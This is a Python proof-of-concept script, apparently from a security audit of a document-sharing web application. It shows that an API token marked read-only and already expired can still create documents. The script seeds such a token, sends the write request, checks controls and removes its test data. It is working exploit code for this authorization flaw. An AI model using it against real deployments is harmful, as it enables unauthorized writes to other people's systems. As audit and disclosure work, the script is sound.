#!/usr/bin/env python3
"""PM-08 — a RestrictedToken issued read-only ("apis.read") and expired a day ago
still performs a write (creates a document). The endpoint selects neither `scopes`
nor `expires`, so it cannot evaluate them.

This proof seeds its own token (hashed exactly as `lib/api/auth/token.ts`), fires
the write, reads the row back, and removes both the token and the written document
in `finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-08-api-token-scope-and-expiry-bypass/poc.py
"""
import sys
import pathlib
import hashlib
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
import pmpoc as P  # noqa: E402
from pmpoc import BASE, db, db_close, post, VULN, CONTROL, OBSERVE, log, summary  # noqa: E402

ATK_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
              "where u.email=$1", ["mallory@attacker.test"])[0]["teamId"]
MALLORY_ID = db('select id from "User" where email=$1', ["mallory@attacker.test"])[0]["id"]

SECRET = P._ENV["NEXTAUTH_SECRET"]
TOKEN = "pmk_pm08_poc_readonly_expired"
HASHED = hashlib.sha256((TOKEN + SECRET).encode()).hexdigest()
DOC_KEY = f"{ATK_TEAM}/doc_pm08poc/x.pdf"

log(f"PM-08 — API token ignores scope and expiry   base={BASE}   team={ATK_TEAM}")
log("")

created_doc_ids = []
try:
    # ---- seed a read-only, already-expired token for the attacker's own team
    db('delete from "RestrictedToken" where "hashedKey"=$1', [HASHED])
    db('insert into "RestrictedToken" '
       '(id,name,"hashedKey","partialKey",scopes,mode,source,"subjectType",'
       '"userId","teamId",expires,"createdAt","updatedAt") '
       "values (gen_random_uuid()::text,$1,$2,$3,'apis.read','live','dashboard','user',"
       "$4,$5, now() - interval '1 day', now(), now())",
       ["PM-08 PoC token", HASHED, "pmk_...poc", MALLORY_ID, ATK_TEAM])
    seeded = db('select scopes, expires from "RestrictedToken" where "hashedKey"=$1', [HASHED])[0]
    CONTROL("token is read-only and already expired",
            seeded["scopes"] == "apis.read" and seeded["expires"] is not None,
            f"scopes={seeded['scopes']} expires={seeded['expires']}")

    # ---- the write, with the read-only expired bearer token
    w_status, w_text, _ = post(f"/api/teams/{ATK_TEAM}/documents", {
        "name": "pm08.pdf", "url": DOC_KEY, "storageType": "S3_PATH",
        "type": "pdf", "contentType": "application/pdf",
    }, headers={"Authorization": f"Bearer {TOKEN}"})
    OBSERVE("write response", f"status={w_status} (500 is the Trigger.dev stub; the row lands first)")
    rows = db('select id from "Document" where "teamId"=$1 and file=$2 order by "createdAt" desc limit 1',
              [ATK_TEAM, DOC_KEY])
    created_doc_ids = [r["id"] for r in rows]
    VULN("an expired read-only token performs a write (document row persisted)",
         bool(rows), f"row={rows[0]['id'] if rows else 'none'}")

    # ---- controls: authentication itself works
    bogus_status, _, _ = post(f"/api/teams/{ATK_TEAM}/documents", {
        "name": "x", "url": f"{ATK_TEAM}/doc_pm08poc/y.pdf", "storageType": "S3_PATH",
        "type": "pdf", "contentType": "application/pdf",
    }, headers={"Authorization": "Bearer not-a-real-token"})
    CONTROL("a bogus bearer token is refused 401", bogus_status == 401, f"status={bogus_status}")

    wrong_team = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                    "where u.email=$1", ["alice@victim.test"])[0]["teamId"]
    xteam_status, _, _ = post(f"/api/teams/{wrong_team}/documents", {
        "name": "x", "url": f"{wrong_team}/doc_pm08poc/z.pdf", "storageType": "S3_PATH",
        "type": "pdf", "contentType": "application/pdf",
    }, headers={"Authorization": f"Bearer {TOKEN}"})
    CONTROL("the valid token aimed at another team is refused 401",
            xteam_status == 401, f"status={xteam_status}")
    OBSERVE("conclusion", "authentication works; only authorization (scope and lifetime) is missing")
finally:
    db('delete from "RestrictedToken" where "hashedKey"=$1', [HASHED])
    for did in created_doc_ids:
        db('delete from "DocumentVersion" where "documentId"=$1', [did])
        db('delete from "Document" where id=$1', [did])
    log("")
    log("  cleanup: seeded token and any written document removed")

summary("PM-08 API token scope and expiry bypass")
db_close()
